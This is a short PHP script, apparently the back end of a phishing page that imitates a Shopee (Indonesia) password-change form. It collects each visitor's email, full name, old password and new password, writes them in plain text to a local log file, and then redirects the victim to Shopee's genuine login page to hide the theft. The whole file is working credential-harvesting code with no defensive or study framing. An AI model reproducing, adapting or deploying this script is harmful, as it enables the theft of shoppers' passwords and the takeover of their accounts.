<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? 'N/A';
    $fullname = $_POST['fullname'] ?? 'N/A';
    $old_password = $_POST['old_password'] ?? 'N/A';
    $new_password = $_POST['new_password'] ?? 'N/A';
    $confirm_password = $_POST['confirm_password'] ?? 'N/A';

    $log = "[" . date("Y-m-d H:i:s") . "]\n";
    $log .= "Email: $email\n";
    $log .= "Nama Lengkap: $fullname\n";
    $log .= "Password Lama: $old_password\n";
    $log .= "Password Baru: $new_password\n";
    $log .= "Konfirmasi Password: $confirm_password\n";
    $log .= "-----------------------------\n";

    file_put_contents("log.txt", $log, FILE_APPEND);

    header("Location: https://shopee.co.id/buyer/login");
    exit;
}
?>
